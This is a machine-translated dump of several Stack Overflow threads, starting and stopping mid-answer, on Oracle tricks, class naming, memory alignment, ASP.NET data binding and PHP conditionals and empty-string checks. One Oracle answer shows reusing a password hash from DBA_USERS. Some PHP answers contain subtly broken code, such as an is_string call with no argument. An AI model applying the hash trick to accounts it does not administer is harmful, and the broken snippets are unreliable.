        // my implementation of calculate height
    }
    // for all other methods: {
    public Object foo(Object bar) {
        return delegate.foo(bar);
    }
} 
```

为此，您需要拦截要替换的小部件的所有创建，这可能意味着为 WidgetFactory 创建一个类似的包装器。而且您必须能够配置要使用的 WidgetFactory。

它还取决于没有客户端尝试将 IWidget 转换回 DefaultWidget ...

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T15:22:27.247

只有我能想到的建议：

1.  挖掘库 API 以查看是否有某种方法可以覆盖默认值和大小。在摇摆（至少对我而言），setMinimum，setMaximum，setdefault，setDefaultOnThursday，...时，尺寸可能会令人困惑。可能有办法。如果您可以联系图书馆设计者，您可能会找到一个可以减轻令人不快的黑客行为的答案。

2.  也许扩展工厂只覆盖一些默认的尺寸参数？取决于工厂，但它可能是可能的。

创建具有相同名称的类可能是唯一的其他选择，正如其他人指出的那样，它很丑陋，当您更新 api 库或部署在不同的环境中时，您很可能会忘记它并破坏东西，忘记为什么拥有classpath 就是这样设置的。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-10-08T10:36:49.473

您可以尝试使用 PowerMock/Mockito 等工具。如果您可以在测试中进行模拟，那么您也可以在生产中进行模拟。

但是，这些工具并不是真正设计为以这种方式使用的，因此您必须自己准备环境，并且无法像在测试中那样使用 JUnit 运行器...

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2008-12-19T15:43:47.763

好吧，我一直在尝试发布建议，然后我发现它们不起作用，或者您已经提到过您尝试过它们。

我能想到的最好的解决方案是继承WindowDisplayFactory，然后在子类的createView()方法中，先调用super.createView()，然后修改返回的对象，把widget完全扔掉，换成一个子类的实例做你想做的事。但是这个小部件是用来初始化东西的，所以你必须去改变所有这些。

然后我想到对从 createView() 返回的对象使用反射并尝试以这种方式修复问题，但同样，这很麻烦，因为使用小部件初始化了很多东西。不过，我想我会尝试使用这种方法，如果它足够简单，可以证明复制和粘贴的合理性。

我会看这个，再加上想看看我是否能想出任何其他的想法。Java 反射当然很好，但它无法击败我在 Perl 和 Python 等语言中看到的动态自省。

# oracle - Oracle 中的隐藏特性

> ID：381231
> 
> 赞同：24
> 
> 时间：2008-12-19T15:12:55.610
> 
> 标签：oracle, oracleinternals

[我喜欢关于sql server 中隐藏功能](https://stackoverflow.com/questions/121243/hidden-features-of-sql-server)的答案和问题

关于甲骨文，您能告诉我们什么？
隐藏的表，......的内部工作原理，秘密存储的过程，具有良好实用程序的包......

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-12-19T15:57:17.410

由于 Apex 现在是每个 Oracle 数据库的一部分，即使您不使用 Apex，这些 Apex 实用程序功能也很有用：

```
SQL> declare
  2    v_array apex_application_global.vc_arr2;
  3    v_string varchar2(2000);
  4  begin
  5  
  6    -- Convert delimited string to array
  7    v_array := apex_util.string_to_table('alpha,beta,gamma,delta', ',');
  8    for i in 1..v_array.count
  9    loop
 10      dbms_output.put_line(v_array(i));
 11    end loop;
 12  
 13    -- Convert array to delimited string
 14    v_string := apex_util.table_to_string(v_array,'|');
 15    dbms_output.put_line(v_string);
 16  end;
 17  /
alpha
beta
gamma
delta
alpha|beta|gamma|delta

PL/SQL procedure successfully completed. 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-12-19T17:34:33.673

“全表扫描并不总是坏的。索引并不总是好的。”

当您根据每个工作单元（通常是每个逻辑读取）访问的行来衡量时，基于索引的访问方法在读取行方面的效率低于完全扫描。然而，许多工具会将全表扫描解释为效率低下的标志。

举个例子，你正在从一个发票表中读取几百张发票，并在一个小的查找表中查找一种付款方式。使用索引来探测每张发票的查找表可能意味着每张发票需要三个或四个逻辑 io。然而，为从发票数据中进行散列连接而准备的查找表的完整扫描可能只需要几次逻辑读取，并且散列连接本身将在内存中完成，几乎没有任何成本。

然而，许多工具会看到这个并看到“全表扫描”，并告诉你尝试使用索引。如果你这样做了，那么你可能刚刚调整了你的代码。

顺便说一下，如上例所示，过度依赖索引会导致“Buffer Cache Hit Ratio”上升。这就是为什么 BCHR 作为系统效率的预测指标大多是无稽之谈。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-12-19T17:32:30.587

基数提示大多没有记录。

```
 explain plan for
 select /*+ cardinality(@inner 5000) */ *
 from   (select /*+ qb_name(inner) */ * from dual)
 /
 select * from table(dbms_xplan.display)
 /
 --------------------------------------------------------------------------
 | Id  | Operation         | Name | Rows  | Bytes | Cost (%CPU)| Time     |
 --------------------------------------------------------------------------
 |   0 | SELECT STATEMENT  |      |  5000 | 10000 |     2   (0)| 00:00:01 |
 |   1 |  TABLE ACCESS FULL| DUAL |     1 |     2 |     2   (0)| 00:00:01 |
 -------------------------------------------------------------------------- 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2008-12-23T17:40:19.727

Buffer Cache Hit Ratio 作为系统效率的预测指标几乎没有意义

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2008-12-23T17:43:28.113

您可以使用闪回查询查看上次的表数据，但有一定的限制。

```
Select *
  from my_table as of timestamp(timestamp '2008-12-01 15:21:13') 
```

11g 具有一个全新的功能集，可以更稳健地保存历史更改。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-12-23T17:40:58.930

频繁重建索引几乎总是浪费时间。

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2010-03-26T19:10:43.460

**wm_concat**像 MySql group_concat 一样工作，但它没有记录。

有数据：

```
-car-   -maker-
Corvette Chevy
Taurus   Ford
Impala   Chevy
Aveo     Chevy

select wm_concat(car) Cars, maker from cars
group by maker 
```

给你：

```
-Cars-                   -maker-
Corvette, Impala, Aveo   Chevy
Taurus                   Ford 
```

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2008-12-19T17:33:08.167

OVERLAPS 谓词未记录在案。

[http://oraclesponge.wordpress.com/2008/06/12/the-overlaps-predicate/](http://oraclesponge.wordpress.com/2008/06/12/the-overlaps-predicate/)

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2008-12-23T17:25:11.973

我刚刚发现了伪列 Ora_rowSCN。如果您不为此设置表格，则此 pcolumn 将为您提供块 SCN。这对于紧急情况非常有用，“哦，废话，我没有对这张表进行审计，想知道是否有人从昨天开始更改了数据。”

但更好的是，如果您在 Rowdependecies ON 的情况下创建表。这会将最后一次更改的 SCN 放在每一行上。这将帮助您避免“丢失编辑”问题，而不必在查询中包含每一列。

IOW，当您的应用抓取一行进行用户修改时，还要选择 Ora_rowscn。然后，当您发布用户的编辑内容时，除了 where 子句中的唯一键之外，还包括 Ora_rowscn = v_rscn。如果有人在您抓取后触摸了该行，也就是丢失了编辑，则更新将匹配零行，因为 ora_rowscn 将发生变化。

非常酷。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2009-02-26T23:50:46.073

如果您获得`PASSWORD`column 的值，`DBA_USERS`您可以在不知道密码的情况下备份/恢复密码：

```
 ALTER USER xxx IDENTIFIED BY VALUES 'xxxx'; 
```

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2008-12-19T18:44:55.293

[http://awads.net/wp/tag/undocumented/](http://awads.net/wp/tag/undocumented/)上的更多无证资料

警告：使用风险自负。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2010-01-02T10:11:02.273

[WITH 子句](http://www.psoug.org/reference/with.html)

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-12-19T17:27:57.960

绕过缓冲区缓存并使用直接路径读取直接从磁盘读取。

```
alter session set "_serial_direct_read"=true; 
```

导致表空间 (9i) 或快速对象 (10g+) 检查点，因此在繁忙的 OLTP 系统上要小心。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2009-07-27T23:03:13.613

我不知道这是否算作隐藏，但是当我看到这种快速查看您正在调整的 SQL 语句发生了什么的方式时，我非常高兴。

```
SELECT /*+ GATHER_PLAN_STATISTICS */ * FROM DUAL;

SELECT * FROM TABLE(dbms_xplan.display_cursor( NULL, NULL, 'RUNSTATS_LAST'))
;

PLAN_TABLE_OUTPUT
-----------------------------------------------------
SQL_ID  5z36y0tq909a8, child number 0
-------------------------------------
SELECT /*+ GATHER_PLAN_STATISTICS */ * FROM DUAL

Plan hash value: 272002086

---------------------------------------------------------------------------------------------
| Id  | Operation         | Name | Starts | E-Rows | A-Rows |   A-Time   | Buffers | Reads  |
---------------------------------------------------------------------------------------------
|   1 |  TABLE ACCESS FULL| DUAL |      1 |      1 |      1 |00:00:00.02 |       3 |      2 |
---------------------------------------------------------------------------------------------

12 rows selected. 
```

在哪里：

*   E-Rows 是估计的行数。
*   A-Rows 是实际的行。
*   A-Time 是实际时间。
*   缓冲区是实际的缓冲区。

如果估计的计划与实际执行相差几个数量级，你就知道你遇到了问题。

* * *

## 回答 #15

> 赞同：3
> 
> 时间：2009-11-02T20:03:59.300

不是隐藏功能，但细粒度访问控制 (FGAC)，也称为行级安全性，是我过去使用过的东西，它的实现效率给我留下了深刻的印象。如果您正在寻找能够保证您可以控制向具有不同权限的用户公开行的粒度的东西 - 无论用于查看数据的应用程序（SQL*Plus 以及您的 Web 应用程序） - 那么这是一个宝石.

内置全文索引的文档更广泛，但由于其稳定性仍然很突出（只需尝试对 MS-SQL 和 Oracle 上的类似数据样本运行全文索引列的完整重新索引，您就会看到速度差异）。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2008-12-19T15:35:33.520

[快照](http://www.orafaq.com/wiki/Advanced_Replication_FAQ)表。也可以在 Oracle Lite 中找到，并且对于滚动您自己的复制机制非常有用。

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2009-02-16T03:23:30.677

[@彼得](https://stackoverflow.com/users/35693/peter-gfader)

您实际上可以在 TOAD 中绑定类型为“Cursor”的变量，然后在您的语句中使用它，它将在结果网格中显示结果。

```
exec open :cur for select * from dual; 
```

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2012-04-18T12:02:45.567

[Scalar subquery caching](http://blog.jooq.org/2011/09/02/oracle-scalar-subquery-caching/) is one of the most surprising features in Oracle

```
-- my_function is NOT deterministic but it is cached!
select t.x, t.y, (select my_function(t.x) from dual)
from t

-- logically equivalent to this, uncached
select t.x, t.y, my_function(t.x) from t 
```

The "caching" subquery above evaluates `my_function(t.x)` only once per unique value of `t.x`. If you have large partitions of the same `t.x` value, this will immensely speed up your queries, even if `my_function` is *not* declared `DETERMINISTIC`. Even if it was `DETERMINISTIC`, you can safe yourself a possibly expensive SQL -> PL/SQL context switch.

Of course, if `my_function` is not a deterministic function, then this can lead to wrong results, so be careful!

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2008-12-19T15:25:56.817

问：如何从 TOAD 调用带游标的存储？

A：例如，更改为您的光标、包名和存储的过程名称

```
declare cursor PCK_UTILS.typ_cursor;  

begin   
    PCK_UTILS.spc_get_encodedstring(  
        'U',  
        10000002,  
        null,  
        'none',  
        cursor);  
end; 
```

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2010-01-20T15:25:18.490

[模型子句](http://www.oracle.com/technology/obe/obe10gdb/bidw/sqlmodel/sqlmodel.htm)（适用于 Oracle 10g 及更高版本）

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2011-10-19T02:33:06.727

WM_CONCAT 用于字符串聚合

# naming - 重命名我的 ServiceManager 类

> ID：381243
> 
> 赞同：1
> 
> 时间：2008-12-19T15:17:26.040
> 
> 标签：naming

遵循 Alan Green 的“在[没有 Manager 的情况下命名 Java 类](http://www.bright-green.com/blog/2003_02_25/naming_java_classes_without_a.html)”，我开始在自己的代码中寻找 *Manager 类。

您将如何重命名以下课程？服务加载器，也许？但它不会从任何地方“加载”任何东西。

```
class ServiceManager
{
    public bool IsRunning { get; };
    public void Start();
    public void Restart();
    public void Stop();
} 
```

另外，请分享您自己重命名的 Manager 类示例。

谢谢

* * *

我可能应该多描述一下这个类的作用。此类启动/停止 .NET Remoting 服务。

Start() 方法为服务注册一个通道（端口）和接口。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T15:25:21.967

经理部分是否添加任何内容？为什么不只是“服务”。

编辑：

澄清一下，这似乎并不管理、控制或对服务做任何事情。读起来像是服务。

如果它对服务或为服务做任何事情，那么我希望能够获得它控制的服务对象并调用它的方法。

如果这是您可以从 Service 对象获得的控制器接口，那将是不同的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T15:18:52.197

也许是服务控制器？服务包装器？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T15:22:24.953

虽然那篇文章是相关的，但我没有看到名称 ServiceManager 的问题

服务也可以，但也许您需要更具体 - 在命名空间中。在我看来，它就像一个 Windows/NT 服务——所以也许只是你自己的描述性命名空间中的服务。

考虑得更多——只是普通的旧服务似乎最合适。使用您选择的命名空间。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T15:34:53.663

如果这是服务类本身，我将重命名以描述它提供的服务类型，即 BookingService、OrderProcessingService、PrintAccountingService。如果它是一个控制不同类型服务的通用类，那么我建议 ServiceController 或 ServiceManager 都是合适的。既然你表达了不使用 Manager 的偏好，那么我会选择前者。

但是，如果有人写了一篇文章说你应该摆脱所有那些“控制器”类名，你会怎么做？底线——类名应该能帮助你理解类的作用。如果它已经工作了，不要为了满足别人的意见而重命名。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-19T15:18:53.087

*   服务监视器？
*   服务控制器？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-18T07:28:33.440

> 此类启动/停止 .NET Remoting 服务。

然后我将其命名为 DotNETRemotingService ...

Technically, it is a wrapper around that service... but then for all intents and purposes, within your code this IS the service, and therefore deserves to be handled as such.

# memory - 内存对齐的目的

> ID：381244
> 
> 赞同：240
> 
> 时间：2008-12-19T15:18:05.163
> 
> 标签：memory, alignment, memory-alignment

诚然，我不明白。假设您有一个长度为 1 字节的内存字的内存。为什么不能在未对齐地址（即不能被 4 整除）上的单个内存访问中访问 4 字节长的变量，就像对齐地址的情况一样？

* * *

## 回答 #1

> 赞同：362
> 
> 时间：2008-12-19T15:51:59.557

现代处理器上的内存子系统仅限于以字长的粒度和对齐方式访问内存；出于多种原因，情况就是如此。

## 速度

现代处理器具有多级高速缓存，数据必须通过这些高速缓存。支持单字节读取将使内存子系统的吞吐量与执行单元的吞吐量紧密绑定（又名 cpu-bound）；这一切都让人想起[PIO 模式是如何被 DMA 超越的](http://www.differencebetween.net/technology/difference-between-dma-and-pio/)，原因与硬盘驱动器中的许多相同。

CPU**总是**以其字长（在 32 位处理器上为 4 个字节）读取，因此当您在支持它的处理器上执行未对齐的地址访问时，处理器将读取多个字。CPU 将读取您请求的地址跨越的每个内存字。这导致访问请求的数据所需的内存事务数量最多增加 2 倍。

因此，读取两个字节很容易比读取四个字节慢。例如，假设您在内存中有一个如下所示的结构：

```
struct mystruct {
    char c;  // one byte
    int i;   // four bytes
    short s; // two bytes
} 
```

在 32 位处理器上，它很可能会如下所示对齐：

![结构布局](https://i.stack.imgur.com/Vkg0j.png)

处理器可以在一个事务中读取这些成员中的每一个。

假设你有一个打包版本的结构，可能来自为了传输效率而打包的网络；它可能看起来像这样：

![打包结构](https://i.stack.imgur.com/Ebcwt.png)

读取第一个字节将是相同的。

当您要求处理器从 0x0005 给您 16 位时，它必须从 0x0004 读取一个字并左移 1 个字节以将其放入 16 位寄存器中；一些额外的工作，但大多数可以在一个周期内处理。

当您从 0x0001 请求 32 位时，您将获得 2X 放大。处理器将从 0x0000 读取到结果寄存器并左移 1 个字节，然后再次从 0x0004 读取到临时寄存器，右移 3 个字节，然后`OR`与结果寄存器一起。

## 范围

对于任何给定的地址空间，如果架构可以假设 2 个 LSB 始终为 0（例如，32 位机器），那么它可以访问 4 倍的内存（2 个保存的位可以代表 4 个不同的状态），或者相同的数量带有 2 位的内存，用于标志之类的东西。从地址中取出 2 个 LSB 将使您获得 4 字节对齐；也称为 4 字节的[步幅](http://en.wikipedia.org/wiki/Stride_of_an_array)。每次增加地址时，它实际上是在增加第 2 位，而不是第 0 位，即最后 2 位将始终继续为`00`。

这甚至会影响系统的物理设计。如果地址总线需要少 2 个位，CPU 上的引脚可以少 2 个，电路板上的走线可以少 2 个。

## 原子性

CPU 可以原子地对对齐的内存字进行操作，这意味着没有其他指令可以中断该操作。[这对于许多无锁数据结构](http://kukuruku.co/hub/cpp/lock-free-data-structures-basics-atomicity-and-atomic-primitives)和其他[并发](http://www.sciencedirect.com/science/article/pii/0304397588900965)范式的正确操作至关重要。

## 结论

处理器的内存系统比这里描述的要复杂得多。关于[x86 处理器如何实际寻址内存](http://www.rcollins.org/articles/pmbasics/tspec_a1_doc.html)的讨论会有所帮助（许多处理器的工作方式类似）。

[您可以在这篇 IBM 文章](https://developer.ibm.com/technologies/systems/articles/pa-dalign/)中阅读到坚持内存对齐的更多好处。

计算机的主要用途是转换数据。现代内存架构和技术经过数十年的优化，以一种高度可靠的方式促进更多数据的输入、输出以及在更多更快的执行单元之间。

## 奖励：缓存

我之前提到的另一个性能对齐是缓存行上的对齐（例如，在某些 CPU 上）64B。

有关通过利用缓存可以获得多少性能的更多信息，请查看[处理器缓存效果库](http://igoro.com/archive/gallery-of-processor-cache-effects/)；从这个[关于缓存行大小的问题](https://stackoverflow.com/questions/14707803/line-size-of-l1-and-l2-caches)

> 了解高速缓存行对于某些类型的程序优化可能很重要。例如，数据的对齐可以确定一个操作是触及一个还是两个高速缓存行。正如我们在上面的示例中看到的，这很容易意味着在未对齐的情况下，操作将慢两倍。

* * *

## 回答 #2

> 赞同：76
> 
> 时间：2008-12-19T15:20:20.573

这是许多底层处理器的限制。它通常可以通过执行 4 次低效的单字节提取而不是一次有效的字提取来解决，但许多语言说明符认为将它们取缔并强制所有内容对齐会更容易。

[OP 在此链接](https://developer.ibm.com/technologies/systems/articles/pa-dalign/)中发现了更多信息。

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2008-12-19T15:31:47.257

你可以使用一些处理器（[nehalem 可以做到这一点](http://www.tomshardware.com/reviews/Intel-i7-nehalem-cpu,2041-12.html)），但以前所有内存访问都在 64 位（或 32 位）线上对齐，因为总线是 64 位宽，你必须一次获取 64 位，并且在对齐的 64 位“块”中获取这些内容要容易得多。

所以，如果你想得到一个字节，你可以获取 64 位块，然后屏蔽掉你不想要的位。如果您的字节位于右端，则简单快捷，但如果它位于该 64 位块的中间，则您必须屏蔽不需要的位，然后将数据转移到正确的位置。更糟糕的是，如果你想要一个 2 字节的变量，但它被分成 2 个块，那么这需要双倍的内存访问。

因此，由于每个人都认为内存很便宜，他们只是让编译器在处理器的块大小上对齐数据，以便您的代码以浪费内存为代价运行得更快、更高效。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2011-03-01T18:38:58.180

从根本上说，原因是内存总线有一些特定的长度，它比内存大小小得多。

因此，CPU 从片上 L1 高速缓存中读取数据，如今通常为 32KB。但是将 L1 高速缓存连接到 CPU 的内存总线的高速缓存行宽度将大大减小。这将是 128*位*的数量级。

所以：

```
262,144 bits - size of memory
    128 bits - size of bus 
```

未对齐的访问偶尔会重叠两个缓存行，这将需要全新的缓存读取才能获取数据。它甚至可能会一直丢失到 DRAM。

此外，CPU 的某些部分将不得不从这两个不同的缓存行中组合出一个对象，每个缓存行都有一段数据。在一条线上，它将处于非常高阶的位中，在另一条中，它将处于非常低阶的位中。

将有专门的硬件完全集成到管道中，处理将对齐的对象移动到 CPU 数据总线的必要位上，但是对于未对齐的对象可能缺少这样的硬件，因为使用这些晶体管来加速正确优化可能更有意义程式。

在任何情况下，有时需要的第二次内存读取会减慢管道速度，无论有多少专用硬件（假设和愚蠢地）专门用于修补未对齐的内存操作。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-04-06T14:26:02.420

@joshperry 对这个问题给出了很好的答案。除了他的回答之外，我还有一些数字以图形方式显示了所描述的效果，尤其是 2X 放大。这是一个指向[Google 电子表格](https://docs.google.com/spreadsheets/d/17tfu_kl4w5Ad8Sqpdh4nl5GEenH8VF6vZY0lh7MDxhI/edit?usp=sharing)的链接，显示了不同单词对齐的效果。此外，这里是一个[Github 要点](https://gist.github.com/koyedele/bf8d32c43989b784b8883dcf59e40f79)的链接，其中包含测试代码。测试代码改编自@joshperry 引用的 Jonathan Rentzsch 撰写[的文章。](https://www.ibm.com/developerworks/library/pa-dalign/)测试在配备四核 2.8 GHz Intel Core i7 64 位处理器和 16GB RAM 的 Macbook Pro 上运行。

[![在此处输入图像描述](https://i.stack.imgur.com/qyUgm.png)](https://i.stack.imgur.com/qyUgm.png)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-06-19T20:10:06.273

如果您有 32 位数据总线，则连接到内存的地址总线地址线将从 A [2]开始，因此在单个总线周期内只能访问 32 位对齐的地址。

因此，如果一个字跨越地址对齐边界——即16/32 位数据的A [0或 32 位数据的 A] [1]不为零，则需要两个总线周期来获取数据。

一些架构/指令集不支持未对齐访问，并且会在此类尝试时生成异常，因此编译器生成的未对齐访问代码不仅需要额外的总线周期，还需要额外的指令，从而使其效率更低。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2011-06-15T20:21:36.840

如果具有字节可寻址内存的系统具有 32 位宽的内存总线，这意味着实际上有四个字节宽的内存系统，它们都被连线以读取或写入相同的地址。对齐的 32 位读取需要将信息存储在所有四个内存系统的相同地址中，因此所有系统都可以同时提供数据。未对齐的 32 位读取将需要一些内存系统从一个地址返回数据，而另一些则需要从下一个更高地址返回数据。尽管有一些内存系统经过优化以能够满足此类请求（除了它们的地址之外，它们实际上还有一个“加一”信号，导致它们使用比指定高一的地址）这样的特性增加了相当大的成本和内存系统的复杂性；

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-19T15:28:46.670

在 PowerPC 上，您可以毫无问题地从奇数地址加载整数。

Sparc 和 I86 以及（我认为）Itatnium 在您尝试此操作时会引发硬件异常。

在大多数现代处理器上，一个 32 位负载与四个 8 位负载不会有太大的不同。数据是否已经在缓存中会产生更大的影响。

# c# - 在 .aspx 中，如何将值从 asp:Repeater 传递给代码隐藏函数

> ID：381253
> 
> 赞同：0
> 
> 时间：2008-12-19T15:21:20.523
> 
> 标签：c#, asp.net, data-binding, repeater

因此，我想使用 jquery 来设置按钮的文本，具体取决于中继器当前行中的属性值。

我需要在代码隐藏中调用一个函数来将值映射到按钮应该具有的文本。因此，我需要将转发器中当前项目的 UserStatus 属性的字符串值传递给我的 foo 函数。

我想做以下事情，尽管这种语法显然不正确：

```
<asp:Repeater ID="dgCustomer" runat="server">
  <ItemTemplate> 
    <input id="rb" name="rb" type="radio" onclick='javascript:$("input.magicbutton").val("<%= foo(DataBinder.Eval(Container.DataItem, "UserStatus")) %>");' 
```

如果代码隐藏包含以下方法定义：

```
protected string foo(string status) 
```

使用转发器中的 Item 值调用 foo 的正确语法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T15:34:16.037

用 <%# 切换 <%= ，看起来你应该很高兴。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T15:35:29.950

我在该代码片段中看到的唯一问题是您需要使用数据绑定块 ( `<%# ... %>`) 而不是表达式块 ( `<%= ... %>`)。

您可能会遇到用双引号括起来的问题，因为它已经包含双引号。您可能必须`foo`返回引号中的值，或者甚至`foo`只返回整个`onclick`事件......

# php - PHP条件，需要括号？

> ID：381259
> 
> 赞同：34
> 
> 时间：2008-12-19T15:22:26.293
> 
> 标签：php, brackets, conditional

我只是在浏览一个论坛，有人询问他们在网上找到的一个 PHP 文件。它在代码中有几个这样的地方：

`if ($REMOTE_ADDR == "") $ip = "no ip"; else $ip = getHostByAddr($REMOTE_ADDR);`

如果条件为真，我一直认为需要括号来括起你想要做的事情。是否有其他选择，例如它是否在您不在的同一行上？

还有另一行是这样的： `if ($action != ""): mail("$adminaddress","Visitor Comment from YOUR SITE",`

我的直觉是说这行不通，但我也不知道它是否是一个过时的 PHP 文件并且它曾经可以工作？

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2008-12-19T15:27:08.373

你可以做这样的 if else 语句：

```
<?php
if ($something) {
   echo 'one conditional line of code';
   echo 'another conditional line of code';
}

if ($something) echo 'one conditional line of code';

if ($something)
echo 'one conditional line of code';
echo 'a NON-conditional line of code'; // this line gets executed regardless of the value of $something
?> 
```

然后你也可以用另一种语法编写 if - else ：

```
<?php
if ($something):
   echo 'one conditional line of code';
   echo 'another conditional line of code';
elseif ($somethingElse):
   echo 'one conditional line of code';
   echo 'another conditional line of code';
else:
   echo 'one conditional line of code';
   echo 'another conditional line of code';
endif;
?> 
```

使用替代语法，您也可以像这样退出解析模式：

```
<?php
if ($something):
?>
one conditional line of code<br />
another conditional line of code
<?php
else:
   echo "it's value was: $value<br />\n";
?>
another conditional line of code
<?php
endif;
?> 
```

但这很快就会变得非常混乱，我不会推荐它的使用（可能除了模板逻辑）。

并使其完整：

```
<?php
$result = $something ? 'something was true' : 'something was false';
echo $result;
?>

equals

<?php
if ($something) {
   $result = 'something was true';
} else {
   $result = 'something was false';
}
echo $result;
?> 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-19T15:31:50.317

更详细地说，大括号是可选的原因是语法看起来像：

```
if(CONDITION) BLOCK
[elseif(CONDITION) BLOCK]
[else BLOCK] 
```

BLOCK 可以是单个语句：

```
foo(); 
```

或者它可以是一组用大括号括起来的语句：

```
{
    foo();
    bar();
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T15:28:03.817

大括号（不是方括号）在 PHP 中是可选的，就像在大多数类似 C 的语法中一样。也许您正在考虑 Perl；对于这种形式的 if 语法，它们是必需的。

冒号是 PHP 支持的另一种控制结构形式。我讨厌它，但有些人（尤其是模板系统设计师，显然）喜欢它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T15:32:46.273

在我看来

```
if ($REMOTE_ADDR == "") $ip = "no ip"; else $ip = getHostByAddr($REMOTE_ADDR); 
```

是有效的，但比以下内容更难阅读：

```
if ($REMOTE_ADDR == "") {
    $ip = "no ip"; 
} else {
    $ip = getHostByAddr($REMOTE_ADDR);
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-07-30T04:37:12.933

9 年过去了，我很惊讶没有人提到[三元运算符](http://php.net/manual/en/language.operators.comparison.php)：

```
$ip = ($REMOTE_ADDR == "") ? "no ip" : getHostByAddr($REMOTE_ADDR); 
```

恕我直言，分配更清楚 - 因为它会导致变量被分配，就像通常的变量分配一样。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T15:37:07.513

是的，允许排除大括号，尽管我多次听到不使用该语法的两个原因：

1.  更难阅读。对另一个程序员来说不太明显。
2.  如果你想在 if 中添加一些东西，那么你需要添加大括号，这在你第一次编码之后会更难，因为大多数编辑器都会为你添加右大括号。

另外，是的，冒号语法是有效的。可以在这里找到替代方案：http: [//php.net/manual/en/control-structures.alternative-syntax.php](http://php.net/manual/en/control-structures.alternative-syntax.php)

* * *

## 回答 #7

> 赞同：-3
> 
> 时间：2008-12-19T15:35:21.277

```
brackets are needed to enclose what you want to do if the condition is true 
```

我想不出任何需要这个的语言

# php - 检查变量是否为空字符串或空字符串的更好方法？

> ID：381265
> 
> 赞同：197
> 
> 时间：2008-12-19T15:24:37.677
> 
> 标签：php, validation

由于 PHP 是一种动态语言，检查提供的字段是否为空的最佳方法是什么？

我想确保：

1.  null 被认为是一个空字符串
2.  只有空格的字符串被认为是空的
3.  “0”不被认为是空的

这是我到目前为止所得到的：

```
$question = trim($_POST['question']);

if ("" === "$question") {
    // Handle error here
} 
```

必须有一个更简单的方法来做到这一点？

* * *

## 回答 #1

> 赞同：320
> 
> 时间：2008-12-19T15:27:32.430

```
// Function for basic field validation (present and neither empty nor only white space
function IsNullOrEmptyString($str){
    return ($str === null || trim($str) === '');
} 
```

* * *

## 回答 #2

> 赞同：119
> 
> 时间：2010-01-20T16:59:51.393

旧帖子，但有人可能像我一样需要它；）

```
if (strlen($str) == 0){
do what ever
} 
```

替换`$str`为您的变量。 `NULL`并且`""`在使用时都返回 0 `strlen`。

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2014-02-06T02:06:35.430

使用 PHP 的 empty() 函数。下面的东西被认为是空的

```
"" (an empty string)
0 (0 as an integer)
0.0 (0 as a float)
"0" (0 as a string)
NULL
FALSE
array() (an empty array)
$var; (a variable declared, but without a value) 
```

有关更多详细信息，请检查[空函数](http://au1.php.net/manual/en/function.empty.php)

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2013-08-10T01:06:44.783

如果我错了，我会谦虚地接受，但我自己进行了测试，发现以下方法适用于测试 string(0) "" 和 NULL 值变量：

```
if ( $question ) {
  // Handle success here
} 
```

这也可以反过来测试成功：

```
if ( !$question ) {
  // Handle error here
} 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-12-19T17:58:46.680

当心`trim()`函数的误报——它在修剪之前执行转换为字符串，因此如果你传递一个空数组，它将返回例如“Array”。这可能不是问题，具体取决于您处理数据的方式，但使用您提供的代码，`question[]`可以在 POST 数据中提供一个名为的字段，并且看起来是一个非空字符串。相反，我会建议：

```
$question = $_POST['question'];

if (!is_string || ($question = trim($question))) {
    // Handle error here
}

// If $question was a string, it will have been trimmed by this point 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-12-19T15:58:36.907

没有更好的方法，但由于这是您通常经常执行的操作，因此您最好将流程自动化。

大多数框架都提供了一种使参数解析变得简单的方法。您可以为此构建自己的对象。快速而肮脏的例子：

```
class Request
{

    // This is the spirit but you may want to make that cleaner :-)
    function get($key, $default=null, $from=null)
    {
         if ($from) :
             if (isset(${'_'.$from}[$key]));
                return sanitize(${'_'.strtoupper($from)}[$key]); // didn't test that but it should work
         else
             if isset($_REQUEST[$key])
